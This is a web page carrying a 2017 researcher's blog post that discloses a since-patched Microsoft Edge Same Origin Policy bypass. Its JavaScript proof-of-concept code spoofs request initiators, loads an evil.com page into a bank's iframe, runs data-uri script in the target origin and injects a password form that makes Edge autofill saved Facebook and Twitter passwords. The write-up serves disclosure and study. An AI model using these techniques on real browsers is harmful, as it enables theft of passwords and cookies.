<!DOCTYPE html><html lang="en"> <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><link rel="alternate icon" type="image/x-icon" href="/favicon.ico"><meta name="generator" content="Astro v5.16.6"><title>SOP bypass / UXSS - Stealing Credentials Pretty Fast (Edge)</title><meta name="description" content><link rel="canonical" href="https://www.brokenbrowser.com/blog/sop-bypass-uxss-stealing-credentials-pretty-fast/"><meta property="og:title" content="SOP bypass / UXSS - Stealing Credentials Pretty Fast (Edge)"><meta property="og:description" content><meta property="og:type" content="website"><meta property="og:url" content="https://www.brokenbrowser.com/blog/sop-bypass-uxss-stealing-credentials-pretty-fast/"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="SOP bypass / UXSS - Stealing Credentials Pretty Fast (Edge)"><meta name="twitter:description" content><link rel="sitemap" href="/sitemap-index.xml"><link rel="alternate" type="application/rss+xml" title="RSS" href="/rss.xml"><link rel="stylesheet" href="/_astro/_slug_.D8CnJWvD.css"></head> <body> <div class="container center"> <header class="header"> <div class="header__inner"> <div class="header__logo"> <a href="/"> <div class="logo">
MagicMac Labs
</div> </a> </div> <ul class="menu menu--mobile"> <li class="menu__trigger">Menu ▾</li> <li> <ul class="menu__dropdown"> <!--<li><a href={`${base}`}>Home</a></li>--> <li><a href="/browser-workshop/">Browser Workshop</a></li> <li><a href="/musings/">Musings</a></li> <li><a href="/about/">About</a></li> </ul> </li> </ul> </div> <nav class="navigation-menu"> <ul class="navigation-menu__inner menu--desktop"> <!--<li><a href={`${base}`}>Home</a></li>--> <li><a href="/browser-workshop/">Browser Workshop</a></li> <li><a href="/musings/">Musings</a></li> <li><a href="/about/">About</a></li> </ul> </nav> </header> <main class="content">  <article> <h1 class="post-title">SOP bypass / UXSS - Stealing Credentials Pretty Fast (Edge)</h1> <div class="post-meta"> <time> <time datetime="2017-05-10T00:00:00.000Z"> 2017-05-10 </time> </time> <span class="post-category"> :: browser-workshop</span>  </div>  <div class="post-content">  <p>Today we are going to steal Twitter and Facebook credentials from the user. The previous two SOP bypasses <a href="../sop-bypass-abusing-read-protocol/">[1]</a> <a href="../sop-bypass-uxss-tweeting-like-charles-darwin/">[2]</a> that allowed attackers to steal passwords and cookies <a href="https://goo.gl/8GxFQC">were not patched in the latest update</a> and this new one is more direct, easier and faster.</p>
<p>Charles -our fictional hacked user- has obediently updated Windows last Tuesday and even changed his password, but he is not aware that the update did not fix the previous two issues (so he is still unprotected) and that there’s a <strong>new way to steal his most precious information</strong>. Unfortunately, he has no idea that his browser, Microsoft Edge, will continue sharing his passwords with the world for several weeks because its <a href="../on-patching-security-bugs/">patching cycle is infrequent compared to other browsers</a>.</p>
<p>In a hurry? Watch the <a href="https://www.youtube.com/watch?v=vO6LRO6Sgcg&#x26;list=PL12o0t84rBX_oDmz93NwGNgTDiWf-HfUY">40 seconds video</a>.</p>
<p>The vulnerability that follows describes <strong>how to steal the credentials and cookies from people using Microsoft Edge</strong>, and, if they are using the default password manager we will be able to steal them in plain-text pretty fast.</p>
<h3 id="-update-this-bug-was-patched-on-2017-06-13"><strong>[ Update: this bug was patched on 2017-06-13 ]</strong></h3>
<hr>
<p>Before starting, I would like to thank <a href="https://twitter.com/campuscodi">Catalin Cimpanu</a> for <a href="https://www.bleepingcomputer.com/news/security/microsoft-edge-vulnerability-allows-cookie-and-password-theft/">his words</a> about the <a href="../sop-bypass-uxss-tweeting-like-charles-darwin/">previous blogpost</a>.</p>
<blockquote>
<p>This flaw, which Caballero disclosed today in a <strong>headache-inducing</strong> technical write-up […]</p>
</blockquote>
<p>His phrase made me think I am not being clear enough, so I’ll do my best to improve on every post. Thanks a lot for pointing that out, Catalin!</p>
<p>Remember: we are here to learn. I am presenting real evidence in the form of PoCs so everyone can judge better what to use. My personal wish is to have <a href="../on-patching-security-bugs/">Microsoft patching faster</a> and not as <a href="https://twitter.com/magicmac2000/status/862063751742337024">an afterthought</a>. I believe Microsoft is a great company with amazing products, but their <a href="../on-patching-security-bugs/">current policies are ridiculous</a>. Change, Microsoft! Think and change.</p>
<h2 id="abstract">Abstract</h2>
<p>A server-redirect combined with a data-uri end up bypassing the Same Origin Policy, which leads to all kind of vulnerabilities like stealing user passwords in plain-text (thanks to the password manager), grabbing cookies, spoofing the content and referrer, etc.</p>
<p>The bug happens because we can force a window to change its location <strong>as if the initiator were the window itself</strong>. For example, a tab hosting evil.com can change the location of a Paypal tab to bankofamerica.com, then BankofAmerica will receive Paypal as its referrer instead of evil, <strong>because Edge confused the real initiator of the request</strong>. If we apply the same idea to iframes in the target page plus a data-uri with code, we can achieve a full SOP bypass.</p>
<p>Also, using a very simple injection we will get user passwords immediately. In our previous <a href="../sop-bypass-uxss-tweeting-like-charles-darwin/">SOP bypass we were stealing passwords</a> by logging out the user expecting Edge to autocomplete, but after applying an Occam’s razor to the code I found that we don’t even need to change the location.</p>
<hr>
<h2 id="server-redirect-blocked-thread">Server Redirect Blocked Thread</h2>
<p>Both Edge and IE confuse the initiator of a request when we change the location of a tab in the middle of a server-redirect. We used this technique to <a href="../uxss-ie-htmlfile/">inject iframes everywhere</a>, but let’s recap and use it here to spoof the referrer. We’ll make whatsmyreferrer think we are coming from microsoft.com.</p>
<p><strong>Recipe to forge the initiator of a request:</strong></p>
<ol>
<li>Open a new window with a server-redirect to microsoft.com.</li>
<li>Block the thread until microsoft starts loading (we will use a bold alert here).</li>
<li>Once the redirection happens, set the location to whatsmyreferrer.com.</li>
<li>Bing! Sorry, Bang! That’s it.</li>
</ol>
<p>There’s an important detail to make this work: in step (3), when we set the final location, <strong>we must do it from the target window itself</strong> using a self reference. For example, this won’t work:</p>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="javascript"><code><span class="line"><span style="color:var(--astro-code-foreground)">w </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-constant)"> window</span><span style="color:var(--astro-code-token-function)">.open</span><span style="color:var(--astro-code-foreground)">(</span><span style="color:var(--astro-code-token-string-expression)">"redir.php?URL=https://www.microsoft.com"</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> "WIN"</span><span style="color:var(--astro-code-foreground)">);</span></span>
<span class="line"><span style="color:var(--astro-code-token-constant)">w</span><span style="color:var(--astro-code-token-function)">.setTimeout</span><span style="color:var(--astro-code-foreground)">(</span><span style="color:var(--astro-code-token-string-expression)">'alert("Wait until the redirection starts")'</span><span style="color:var(--astro-code-foreground)">);</span></span>
<span class="line"><span style="color:var(--astro-code-token-constant)">w</span><span style="color:var(--astro-code-foreground)">.</span><span style="color:var(--astro-code-token-constant)">location</span><span style="color:var(--astro-code-foreground)">.href </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-string-expression)"> "https://www.whatismyreferer.com"</span><span style="color:var(--astro-code-foreground)">; </span><span style="color:var(--astro-code-token-comment)">// Does not work</span></span></code></pre>
<p>We need the target window to change its own URL. Let’s move that to the setTimeout:</p>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="javascript"><code><span class="line"><span style="color:var(--astro-code-foreground)">w </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-constant)"> window</span><span style="color:var(--astro-code-token-function)">.open</span><span style="color:var(--astro-code-foreground)">(</span><span style="color:var(--astro-code-token-string-expression)">"redir.php?URL=https://www.microsoft.com"</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> "WIN"</span><span style="color:var(--astro-code-foreground)">);</span></span>
<span class="line"><span style="color:var(--astro-code-token-constant)">w</span><span style="color:var(--astro-code-foreground)">.myself </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-foreground)"> w; </span><span style="color:var(--astro-code-token-comment)">// Self reference saved in the new window</span></span>
<span class="line"><span style="color:var(--astro-code-token-constant)">w</span><span style="color:var(--astro-code-token-function)">.setTimeout</span><span style="color:var(--astro-code-foreground)">(</span><span style="color:var(--astro-code-token-string-expression)">'alert("Wait until the redirection starts")'</span><span style="color:var(--astro-code-token-keyword)">+</span></span>
<span class="line"><span style="color:var(--astro-code-token-string-expression)">             'myself.location.href = "https://www.whatismyreferer.com"'</span><span style="color:var(--astro-code-foreground)">);</span></span></code></pre>
<p>The code above looks good, but Edge will destroy the self-reference variable <strong>myself</strong> when doing the redirect, but there’s a trick to prevent that: place the reference inside any built-in JS object, like Math. Let’s change that, watch how the variable “myself” is part of the Math object.</p>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="javascript"><code><span class="line"><span style="color:var(--astro-code-foreground)">w </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-constant)"> window</span><span style="color:var(--astro-code-token-function)">.open</span><span style="color:var(--astro-code-foreground)">(</span><span style="color:var(--astro-code-token-string-expression)">"redir.php?URL=https://www.microsoft.com"</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> "WIN"</span><span style="color:var(--astro-code-foreground)">);</span></span>
<span class="line"><span style="color:var(--astro-code-token-constant)">w</span><span style="color:var(--astro-code-foreground)">.</span><span style="color:var(--astro-code-token-constant)">Math</span><span style="color:var(--astro-code-foreground)">.myself </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-foreground)"> w; </span><span style="color:var(--astro-code-token-comment)">// Now in the Math object!</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-token-comment)">// Crashes below</span></span>
<span class="line"><span style="color:var(--astro-code-token-constant)">w</span><span style="color:var(--astro-code-token-function)">.setTimeout</span><span style="color:var(--astro-code-foreground)">(</span><span style="color:var(--astro-code-token-string-expression)">'alert("Wait until the redirection starts")'</span><span style="color:var(--astro-code-token-keyword)">+</span></span>
<span class="line"><span style="color:var(--astro-code-token-string-expression)">             'Math.myself.location.href = "https://www.whatismyreferer.com"'</span><span style="color:var(--astro-code-foreground)">);</span></span></code></pre>
<p>That’s good, but Edge developers have been poking on that code lately, and now it crashes [Fail Fast Exception]. It is a non-exploitable crash that happens <em>apparently</em> when trying to execute code in the “not-so-ready” window. But we don’t really care about that because there is a workaround to avoid the crash: window.open with javascript code. What a paradox! Instead of trying to exploit a crash we are trying to avoid it. :) Anyway, the following code will run our bits indirectly, making the new window happy:</p>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="javascript"><code><span class="line"><span style="color:var(--astro-code-token-comment)">// Not crashing anymore!</span></span>
<span class="line"><span style="color:var(--astro-code-foreground)">w </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-constant)"> window</span><span style="color:var(--astro-code-token-function)">.open</span><span style="color:var(--astro-code-foreground)">(</span><span style="color:var(--astro-code-token-string-expression)">"redir.php?URL=https://www.microsoft.com"</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> "WIN"</span><span style="color:var(--astro-code-foreground)">);</span></span>
<span class="line"><span style="color:var(--astro-code-token-constant)">w</span><span style="color:var(--astro-code-foreground)">.</span><span style="color:var(--astro-code-token-constant)">Math</span><span style="color:var(--astro-code-foreground)">.myself </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-foreground)"> w;</span></span>
<span class="line"><span style="color:var(--astro-code-token-constant)">window</span><span style="color:var(--astro-code-token-function)">.open</span><span style="color:var(--astro-code-foreground)">(</span><span style="color:var(--astro-code-token-string-expression)">"javascript:"</span><span style="color:var(--astro-code-token-keyword)"> +</span></span>
<span class="line"><span style="color:var(--astro-code-token-string-expression)">               "alert('Wait until the redirection starts');"</span><span style="color:var(--astro-code-token-keyword)"> +</span></span>
<span class="line"><span style="color:var(--astro-code-token-string-expression)">               "Math.myself.location = 'https://www.whatismyreferer.com'"</span><span style="color:var(--astro-code-token-punctuation)">,</span></span>
<span class="line"><span style="color:var(--astro-code-token-string-expression)">            "WIN"</span><span style="color:var(--astro-code-foreground)">);</span></span>
<span class="line"></span></code></pre>
<p><img src="/images/2017/05/01-referrer-spoof.png" alt=""></p>
<p>Great. We have another referrer spoof. If we want this to work on IE, we just need to add an <strong>execScript(“Math”)</strong> forcing the browser to instantiate the Math object before using it.</p>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="javascript"><code><span class="line"><span style="color:var(--astro-code-foreground)">w </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-constant)"> window</span><span style="color:var(--astro-code-token-function)">.open</span><span style="color:var(--astro-code-foreground)">(</span><span style="color:var(--astro-code-token-string-expression)">"redir.php?URL=https://www.microsoft.com"</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> "WIN"</span><span style="color:var(--astro-code-foreground)">);</span></span>
<span class="line"><span style="color:var(--astro-code-token-constant)">w</span><span style="color:var(--astro-code-token-function)">.execScript</span><span style="color:var(--astro-code-foreground)">(</span><span style="color:var(--astro-code-token-string-expression)">"Math"</span><span style="color:var(--astro-code-foreground)">); </span><span style="color:var(--astro-code-token-comment)">// Forces IE to instantiate the Math object</span></span>
<span class="line"><span style="color:var(--astro-code-token-constant)">w</span><span style="color:var(--astro-code-foreground)">.</span><span style="color:var(--astro-code-token-constant)">Math</span><span style="color:var(--astro-code-foreground)">.myself </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-foreground)"> w;</span></span>
<span class="line"><span style="color:var(--astro-code-token-constant)">window</span><span style="color:var(--astro-code-token-function)">.open</span><span style="color:var(--astro-code-foreground)">(</span><span style="color:var(--astro-code-token-string-expression)">"javascript:"</span><span style="color:var(--astro-code-token-keyword)"> +</span></span>
<span class="line"><span style="color:var(--astro-code-token-string-expression)">               "alert('Wait until the redirection starts');"</span><span style="color:var(--astro-code-token-keyword)"> +</span></span>
<span class="line"><span style="color:var(--astro-code-token-string-expression)">               "Math.myself.location = 'https://www.whatismyreferer.com'"</span><span style="color:var(--astro-code-token-punctuation)">,</span></span>
<span class="line"><span style="color:var(--astro-code-token-string-expression)">            "WIN"</span><span style="color:var(--astro-code-foreground)">);</span></span></code></pre>
<h2 id="setting-the-location-of-an-iframe">Setting the location of an iframe</h2>
<p>Let’s try the same thing, but setting the location of an iframe instead of the top window. This is a bypass of the SuperNavigate, something that we’ve seen in the recently patched <a href="../free-ticket-to-the-intranet-zone/">Fake Ticket to the Intranet Zone</a> post. The name <strong>SuperNavigate</strong> comes from the binary functions in EdgeHtml.dll and essentially, it is just the power to change the location of an iframe from a window on a different domain. For example, opening a new window on bankofamerica.com and changing the location of any of its iframes.</p>
<p>This is super-easy, just add the window/iframe index to the code above and we are done. For example, if we want to change the location of the first iframe in the target page we would do:</p>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="javascript"><code><span class="line"><span style="color:var(--astro-code-token-comment)">// Load badbits.html in the first iframe of the target window</span></span>
<span class="line"><span style="color:var(--astro-code-token-constant)">Math</span><span style="color:var(--astro-code-foreground)">.myself[</span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-foreground)">].location </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-string-expression)"> 'https://evil.com/badbits.html'</span><span style="color:var(--astro-code-foreground)">;</span></span></code></pre>
<p>Remember that most sites use hidden iframes to do postbacks and visible ones for advertising. Bank of America uses iframes so let’s use it as our target. I’ve created a simple html which prompts the user to enter the password, but it looks legit when rendered in bankofamerica.</p>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="javascript"><code><span class="line"><span style="color:var(--astro-code-foreground)">w </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-constant)"> window</span><span style="color:var(--astro-code-token-function)">.open</span><span style="color:var(--astro-code-foreground)">(</span><span style="color:var(--astro-code-token-string-expression)">"redir.php?URL=https://www.bankofamerica.com"</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> "WIN"</span><span style="color:var(--astro-code-foreground)">);</span></span>
<span class="line"><span style="color:var(--astro-code-token-constant)">w</span><span style="color:var(--astro-code-foreground)">.</span><span style="color:var(--astro-code-token-constant)">Math</span><span style="color:var(--astro-code-foreground)">.myself </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-foreground)"> w;</span></span>
<span class="line"><span style="color:var(--astro-code-token-constant)">window</span><span style="color:var(--astro-code-token-function)">.open</span><span style="color:var(--astro-code-foreground)">(</span><span style="color:var(--astro-code-token-string-expression)">"javascript:"</span><span style="color:var(--astro-code-token-keyword)"> +</span></span>
<span class="line"><span style="color:var(--astro-code-token-string-expression)">               "alert('Wait until the redirection happens');"</span><span style="color:var(--astro-code-token-keyword)"> +</span></span>
<span class="line"><span style="color:var(--astro-code-token-string-expression)">               "Math.myself[0].location = 'https://www.cracking.com.ar/demos/opendata/prompt.html'"</span><span style="color:var(--astro-code-token-punctuation)">,</span></span>
<span class="line"><span style="color:var(--astro-code-token-string-expression)">            "WIN"</span><span style="color:var(--astro-code-foreground)">);</span></span></code></pre>
<p><img src="/images/2017/05/02-iframe-location-change.png" alt=""></p>
<p>The prompt above is coming from cracking.com.ar so it can’t access the top window. Anyway, let’s try to achieve a real SOP bypass!</p>
<h2 id="setting-the-location-of-an-iframe-to-a-data-uri">Setting the location of an iframe to a data-uri</h2>
<p>Now that we can change the location of iframes, the game is almost over. If we set a data-uri with javascript code instead of a real location, it will execute **almost **in the context of its parent/originator. To be clear and following the example of bankofamerica, if we change the URL to a data-uri, like this:</p>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="html"><code><span class="line"><span style="color:var(--astro-code-foreground)">Math.myself[0].location = 'data:text/html,&#x3C;</span><span style="color:var(--astro-code-token-string-expression)">script</span><span style="color:var(--astro-code-foreground)">></span><span style="color:var(--astro-code-token-function)">alert</span><span style="color:var(--astro-code-foreground)">(</span><span style="color:var(--astro-code-token-string-expression)">"I am isolated from the top!"</span><span style="color:var(--astro-code-foreground)">)&#x3C;/</span><span style="color:var(--astro-code-token-string-expression)">script</span><span style="color:var(--astro-code-foreground)">>';</span></span></code></pre>
<p>On Microsoft Edge, the alert above will execute in its own isolated context, but a simple document.write after the document has been loaded will set its origin to match its parent/originator. Observe the code below where we show the document.domain: it now matches its parent, <strong>SOP bypass</strong>.</p>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="html"><code><span class="line"><span style="color:var(--astro-code-foreground)">Math.myself[0].location = 'data:text/html,&#x3C;</span><span style="color:var(--astro-code-token-string-expression)">script</span><span style="color:var(--astro-code-foreground)">></span><span style="color:var(--astro-code-token-string-expression)">' +</span></span>
<span class="line"><span style="color:var(--astro-code-token-string-expression)">   'window.onload = function(){'</span><span style="color:var(--astro-code-token-keyword)"> +</span></span>
<span class="line"><span style="color:var(--astro-code-token-string-expression)">   '   document.write("&#x3C;script>alert(document.domain)&#x3C;\\\/script>");'</span><span style="color:var(--astro-code-token-keyword)"> +</span></span>
<span class="line"><span style="color:var(--astro-code-token-string-expression)">   '   document.close();'</span><span style="color:var(--astro-code-token-keyword)"> +</span></span>
<span class="line"><span style="color:var(--astro-code-token-string-expression)">   '}&#x3C;/script>'</span><span style="color:var(--astro-code-foreground)">;</span></span></code></pre>
<p>Excellent! We have a full SOP bypass again, but don’t think that this last part has the culprit, bug hunter. The main problem happens because we are allowed to set locations on behalf of other origins. That’s really bad.</p>
<p>Let’s try that on Google, but but instead of showing the domain, just the cookies:</p>
<p><img src="/images/2017/05/03-data-uri-sop-bypass.png" alt=""></p>
<h2 id="grabbing-passwords-pretty-fast">Grabbing passwords pretty fast</h2>
<p>In our previous <a href="../sop-bypass-uxss-tweeting-like-charles-darwin/">UXSS we logged out the user to force Edge auto-complete the password</a>, but I realized later that Edge will autocomplete <strong>any input-password box</strong> as long as it is in the proper domain and has this format (newlines/spaces not needed).</p>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="html"><code><span class="line"><span style="color:var(--astro-code-foreground)">&#x3C;</span><span style="color:var(--astro-code-token-string-expression)">form</span><span style="color:var(--astro-code-foreground)">></span></span>
<span class="line"><span style="color:var(--astro-code-foreground)">  &#x3C;</span><span style="color:var(--astro-code-token-string-expression)">input</span><span style="color:var(--astro-code-foreground)"> /></span></span>
<span class="line"><span style="color:var(--astro-code-foreground)">  &#x3C;</span><span style="color:var(--astro-code-token-string-expression)">input</span><span style="color:var(--astro-code-token-function)"> type</span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-string-expression)">"password"</span><span style="color:var(--astro-code-foreground)"> /></span></span>
<span class="line"><span style="color:var(--astro-code-foreground)">&#x3C;/</span><span style="color:var(--astro-code-token-string-expression)">form</span><span style="color:var(--astro-code-foreground)">></span></span></code></pre>
<p>That’s it! If we inject that code in domains with saved passwords, Edge will immediately autocomplete them. This means that we don’t even need to move the user to login-pages anymore. In fact, it does not matter if we add events, names, classes, or anything to those inputs, Edge will obediently fill them out. For example, if we take the user to facebook.com and inject this code, it will immediately alert the saved password in plain-text.</p>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="html"><code><span class="line"><span style="color:var(--astro-code-foreground)">&#x3C;</span><span style="color:var(--astro-code-token-string-expression)">form</span><span style="color:var(--astro-code-foreground)">></span></span>
<span class="line"><span style="color:var(--astro-code-foreground)">  &#x3C;</span><span style="color:var(--astro-code-token-string-expression)">input</span><span style="color:var(--astro-code-foreground)"> /></span></span>
<span class="line"><span style="color:var(--astro-code-foreground)">  &#x3C;</span><span style="color:var(--astro-code-token-string-expression)">input</span><span style="color:var(--astro-code-token-function)"> type</span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-string-expression)">"password"</span><span style="color:var(--astro-code-token-function)"> onchange</span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-string-expression)">"</span><span style="color:var(--astro-code-token-function)">alert</span><span style="color:var(--astro-code-token-string-expression)">(</span><span style="color:var(--astro-code-token-constant)">this</span><span style="color:var(--astro-code-token-string-expression)">.value)"</span><span style="color:var(--astro-code-foreground)"> /></span></span>
<span class="line"><span style="color:var(--astro-code-foreground)">&#x3C;/</span><span style="color:var(--astro-code-token-string-expression)">form</span><span style="color:var(--astro-code-foreground)">></span></span></code></pre>
<p>Check out the first two PoCs where we show the username and password of Facebook and Twitter!</p>
<h2 id="-video-poc--all-pocs-in-a-zip">[ <a href="https://www.youtube.com/watch?v=vO6LRO6Sgcg&#x26;list=PL12o0t84rBX_oDmz93NwGNgTDiWf-HfUY">Video PoC</a> ] [ <a href="https://goo.gl/zHr4Cu">All PoCs in a zip</a>]</h2>
<h2 id="conclusion">Conclusion</h2>
<p>We’ve seen how faking the originator leads to a referrer spoof, but thanks to the existence of data-uris and the fact that most sites render iframes, we can end up turning this vulnerability into a full SOP bypass. Then, because the password manager tries to be smart and complete everything without checking too much, we can simply render a universal snipped of code that will work everywhere.</p>
<p>In my opinion, Microsoft Edge is making huge progress in the memory corruption area and sandboxing, but basic design issues are still there. I hope this changes soon.</p>
<p><strong>Microsoft: please patch faster.</strong> Move Edge to the Windows Store and update <strong>its security issues</strong> as frequently as needed. Audit MSRC constantly and do not forget that they represent the company when talking to researchers. Not everyone is capable of doing that. I wholeheartedly wish you the best.</p>
<p>Special thanks to <a href="https://twitter.com/1lastBr3ath">1lastBr3ath</a> for pointing me out a few typos on this post. Corrected!</p>
<p>Have a nice day!</p>
<p><a href="https://twitter.com/magicmac2000">Manuel</a>.</p> <div class="pagination"> <div class="pagination__title"> <span class="pagination__title-h">Read other posts</span> <hr> </div> <div class="pagination__buttons">  <a href="/blog/sop-bypass-uxss-tweeting-like-charles-darwin/" class="button inline prev">
&lt; [SOP bypass / UXSS - Tweeting like Charles Darwin (Edge)]
</a> <span>::</span> <a href="/blog/revealing-the-content-of-the-address-bar-ie/" class="button inline next">
[Revealing the content of the address bar (IE)] &gt;
</a> </div> </div>  </div> </article> <script type="module">document.addEventListener("DOMContentLoaded",()=>{document.querySelectorAll("pre.astro-code").forEach(t=>{const n=document.createElement("div");n.className="highlight",t.parentNode?.insertBefore(n,t),n.appendChild(t);const a=t.getAttribute("data-language")||"text",o=document.createElement("div");if(o.className="code-title",o.textContent=a,navigator.clipboard){const e=document.createElement("button");e.className="copy-button",e.textContent="Copy",e.addEventListener("click",async()=>{const c=t.textContent||"";try{await navigator.clipboard.writeText(c),e.textContent="Copied",setTimeout(()=>{e.textContent="Copy"},1e3)}catch(r){console.error("Failed to copy:",r)}}),o.appendChild(e)}n.insertBefore(o,t)})});</script>  <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>  </main> <footer class="footer"> <div class="footer__inner"> <div class="copyright"> <span>© 2026 MagicMac Labs</span> </div> </div> </footer> </div> <script type="module">(()=>{const s=document.querySelector(".container"),o=document.querySelectorAll(".menu");document.body.addEventListener("click",()=>{o.forEach(e=>{e.classList.contains("open")&&e.classList.remove("open")})}),window.addEventListener("resize",()=>{o.forEach(e=>{e.classList.remove("open")})}),o.forEach(e=>{const i=e.querySelector(".menu__trigger"),t=e.querySelector(".menu__dropdown");i&&t&&(i.addEventListener("click",n=>{n.stopPropagation(),e.classList.contains("open")?e.classList.remove("open"):(o.forEach(c=>c.classList.remove("open")),e.classList.add("open")),s&&t.getBoundingClientRect().right>s.getBoundingClientRect().right&&(t.style.left="auto",t.style.right="0")}),t.addEventListener("click",n=>n.stopPropagation()))})})();</script> </body> </html> 